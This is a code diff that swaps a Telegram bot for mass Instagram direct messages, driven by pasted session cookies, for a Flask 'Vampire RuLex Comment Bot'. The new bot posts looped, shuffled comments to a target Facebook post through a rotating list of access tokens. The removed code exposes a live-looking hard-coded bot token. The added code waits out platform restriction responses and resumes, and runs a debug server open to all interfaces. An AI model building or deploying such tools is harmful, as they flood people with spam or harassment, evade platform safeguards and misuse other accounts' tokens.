@@ -1,106 +1,206 @@
-import telebot
-from telebot import types
-from instagram_private_api import Client, ClientCookieAuthError
+from flask import Flask, request
+import requests
+from threading import Thread, Event
 import time
-import os
+import random
+import logging
 
-bot = telebot.TeleBot("8003051865:AAFU_jM4OAvfeYHw0eDMQ9FLAAKcvJS9200")
+app = Flask(__name__)
+app.debug = True
 
-user_data = {}
+# Headers for Facebook Graph API
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'referer': 'www.google.com'
+}
 
-@bot.message_handler(commands=['start'])
-def start(message):
-    bot.send_message(message.chat.id, "Welcome! Send /send to start sending Instagram DMs.")
+stop_event = Event()
+threads = []
 
-@bot.message_handler(commands=['send'])
-def send(message):
-    user_data[message.chat.id] = {}
-    msg = bot.send_message(message.chat.id, "Send your Instagram cookie string:")
-    bot.register_next_step_handler(msg, get_cookie)
+logging.basicConfig(filename='bot.log', level=logging.INFO)
 
-def get_cookie(message):
-    cookie = message.text.strip()
-    user_data[message.chat.id]['cookie'] = cookie
-    msg = bot.send_message(message.chat.id, "Enter the Instagram thread ID:")
-    bot.register_next_step_handler(msg, get_thread_id)
+@app.route('/ping', methods=['GET'])
+def ping():
+    return "✅ I am alive!", 200
 
-def get_thread_id(message):
-    thread_id = message.text.strip()
-    user_data[message.chat.id]['thread_id'] = thread_id
-    msg = bot.send_message(message.chat.id, "Enter the name to prefix in each message:")
-    bot.register_next_step_handler(msg, get_name)
+def send_comments(access_tokens, post_id, prefix, time_interval, messages):
+    while not stop_event.is_set():
+        try:
+            random.shuffle(messages)
+            random.shuffle(access_tokens)
+            for message in messages:
+                if stop_event.is_set():
+                    break
+                for access_token in access_tokens:
+                    api_url = f'https://graph.facebook.com/v20.0/{post_id}/comments'
+                    comment = f"{prefix} {message}" if prefix else message
+                    parameters = {'access_token': access_token, 'message': comment}
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        logging.info(f"✅ Comment Sent: {comment[:30]} via {access_token[:10]}")
+                        print(f"✅ Comment Sent: {comment[:30]} via {access_token[:10]}")
+                    else:
+                        logging.error(f"❌ Fail [{response.status_code}]: {comment[:30]} - {response.text}")
+                        print(f"❌ Fail [{response.status_code}]: {comment[:30]} - {response.text}")
+                        if response.status_code in [400, 403]:
+                            logging.warning("⚠️ Rate limit or restriction detected. Waiting 5 minutes...")
+                            print("⚠️ Rate limit or restriction detected. Waiting 5 minutes...")
+                            time.sleep(300)
+                            continue
+                    time.sleep(max(time_interval, 120))
+        except Exception as e:
+            logging.error(f"⚠️ Error in comment loop: {e}")
+            print(f"⚠️ Error in comment loop: {e}")
+            time.sleep(60)
 
-def get_name(message):
-    name = message.text.strip()
-    user_data[message.chat.id]['name'] = name
-    msg = bot.send_message(message.chat.id, "Now upload the message text file (.txt):")
-    bot.register_next_step_handler(msg, get_file)
+@app.route('/', methods=['GET', 'POST'])
+def send_comment():
+    global threads
+    if request.method == 'POST':
+        token_file = request.files['tokenFile']
+        access_tokens = token_file.read().decode().strip().splitlines()
+        post_id = request.form.get('postId')
+        prefix = request.form.get('prefix')
+        time_interval = int(request.form.get('time'))
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
 
-def get_file(message):
-    if not message.document:
-        bot.send_message(message.chat.id, "Please send a .txt file.")
-        return
+        if not any(thread.is_alive() for thread in threads):
+            stop_event.clear()
+            thread = Thread(target=send_comments, args=(access_tokens, post_id, prefix, time_interval, messages))
+            thread.start()
+            threads = [thread]
 
-    file_info = bot.get_file(message.document.file_id)
-    downloaded_file = bot.download_file(file_info.file_path)
+    return '''
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Vampire RuLex Comment Bot</title>
+      <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Rajdhani:wght@400;500;700&display=swap" rel="stylesheet">
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+      <style>
+        :root {
+          --bg-dark: #0d0d12;
+          --bg-darker: #07070a;
+          --accent: #ff2a6d;
+          --accent-dark: #d1004d;
+          --text: #e0e0e8;
+          --text-dim: #a0a0b0;
+          --card-bg: #151520;
+          --card-border: #252535;
+          --input-bg: #1a1a2a;
+        }
 
-    filepath = f"{message.chat.id}_messages.txt"
-    with open(filepath, "wb") as f:
-        f.write(downloaded_file)
+        body {
+          background-color: var(--bg-dark);
+          background-image: 
+            radial-gradient(circle at 15% 50%, rgba(120, 20, 80, 0.2) 0%, transparent 25%),
+            radial-gradient(circle at 85% 30%, rgba(80, 20, 120, 0.2) 0%, transparent 25%),
+            radial-gradient(circle at 50% 80%, rgba(160, 30, 90, 0.2) 0%, transparent 25%);
+          color: var(--text);
+          font-family: 'Rajdhani', sans-serif;
+          min-height: 100vh;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+        }
 
-    user_data[message.chat.id]['msgfile'] = filepath
-    msg = bot.send_message(message.chat.id, "Enter delay (in seconds) between messages:")
-    bot.register_next_step_handler(msg, get_delay)
+        .container {
+          width: 100%;
+          max-width: 400px;
+          background-color: var(--card-bg);
+          border-radius: 12px;
+          padding: 25px;
+          box-shadow: 0 0 25px rgba(255, 42, 109, 0.2);
+        }
 
-def get_delay(message):
-    try:
-        delay = int(message.text.strip())
-    except:
-        bot.send_message(message.chat.id, "Enter a valid number for delay.")
-        return
+        h1 {
+          text-align: center; 
+          margin-bottom: 20px; 
+          color: var(--accent); 
+          font-family: 'Orbitron', sans-serif; 
+          animation: glow 2s infinite alternate;
+        }
 
-    user_data[message.chat.id]['delay'] = delay
-    bot.send_message(message.chat.id, "Starting DM sending...")
-    send_messages(message.chat.id)
+        @keyframes glow {
+          from { text-shadow: 0 0 5px var(--accent); }
+          to { text-shadow: 0 0 15px var(--accent), 0 0 25px var(--accent-dark); }
+        }
 
-def send_messages(chat_id):
-    data = user_data.get(chat_id)
-    if not data:
-        return
+        label { color: var(--text-dim); font-weight: 600; margin-top: 10px; display: block; }
 
-    cookie_string = data['cookie']
-    thread_id = data['thread_id']
-    name = data['name']
-    filepath = data['msgfile']
-    delay = data['delay']
+        .form-control {
+          width: 100%;
+          padding: 10px;
+          margin-bottom: 15px;
+          border-radius: 6px;
+          border: 1px solid var(--card-border);
+          background-color: var(--input-bg);
+          color: var(--text);
+        }
 
-    try:
-        cookie_dict = {}
-        for part in cookie_string.split(';'):
-            if '=' in part:
-                key, value = part.strip().split('=', 1)
-                cookie_dict[key.strip()] = value.strip()
+        button {
+          background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+          color: white;
+          border: none;
+          padding: 12px;
+          width: 100%;
+          border-radius: 6px;
+          margin-top: 10px;
+          cursor: pointer;
+          transition: all 0.3s;
+        }
 
-        api = Client(cookie=None, auto_patch=True, authenticate=False)
-        api._initiate_session()
-        api._session.cookies.update(cookie_dict)
-        api.authenticated_user_id = api.current_user()['user']['pk']
+        button:hover {
+          transform: translateY(-3px);
+          box-shadow: 0 0 20px var(--accent);
+        }
 
-        with open(filepath, "r", encoding="utf-8") as f:
-            messages = [line.strip() for line in f if line.strip()]
+        .footer { text-align: center; margin-top: 15px; color: var(--text-dim); }
 
-        for msg in messages:
-            full_msg = f"{name} {msg}"
-            api.direct_v2_send_text(recipient_users=[[thread_id]], text=full_msg)
-            bot.send_message(chat_id, f"✅ Sent: {full_msg}")
-            time.sleep(delay)
+        @media (max-width: 768px) {
+          .container { padding: 15px; max-width: 95%; }
+          h1 { font-size: 1.8rem; }
+          .form-control { height: 35px; }
+          button { padding: 10px; }
+        }
+      </style>
+    </head>
+    <body>
+      <h1>💀 Vampire RuLex</h1>
+      <div class="container text-center">
+        <form method="post" enctype="multipart/form-data">
+          <label>Token File</label><input type="file" name="tokenFile" class="form-control" required>
+          <label>Post ID</label><input type="text" name="postId" class="form-control" required>
+          <label>Comment Prefix (Optional)</label><input type="text" name="prefix" class="form-control">
+          <label>Delay (seconds)</label><input type="number" name="time" class="form-control" required>
+          <label>Comments File</label><input type="file" name="txtFile" class="form-control" required>
+          <button type="submit"><i class="fas fa-play"></i> Start Commenting</button>
+        </form>
+        <form method="post" action="/stop">
+          <button type="submit" style="background:#c00;"><i class="fas fa-stop"></i> Stop Commenting</button>
+        </form>
+      </div>
+      <div class="footer">
+        💀 Powered By Vampire RuLex
+      </div>
+    </body>
+    </html>
+    '''
 
-        bot.send_message(chat_id, "✅ Done sending all messages.")
-        os.remove(filepath)
+@app.route('/stop', methods=['POST'])
+def stop_sending():
+    stop_event.set()
+    return '✅ Commenting stopped.'
 
-    except ClientCookieAuthError:
-        bot.send_message(chat_id, "❌ Invalid cookie or session expired.")
-    except Exception as e:
-        bot.send_message(chat_id, f"⚠️ Error: {e}")
-
-bot.polling()
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
